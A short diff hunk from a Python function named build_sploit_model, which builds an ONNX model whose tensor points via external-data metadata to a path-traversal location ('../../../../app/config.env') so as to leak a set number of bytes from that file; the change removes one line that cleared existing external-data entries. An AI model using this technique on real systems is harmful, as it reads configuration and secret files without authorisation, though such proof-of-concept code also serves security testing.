@@ -93,7 +93,6 @@ def build_sploit_model(out_path, path="../../../../app/config.env", bytes_to_lea
     tensor.data_type = onnx.helper.TensorProto.DataType.INT64
     bytes_size = bytes_to_leak
     tensor.dims.extend([bytes_size])
-    del tensor.external_data[:]
     tensor.data_location = onnx.TensorProto.EXTERNAL
     entry = tensor.external_data.add()
     entry.key = "location"
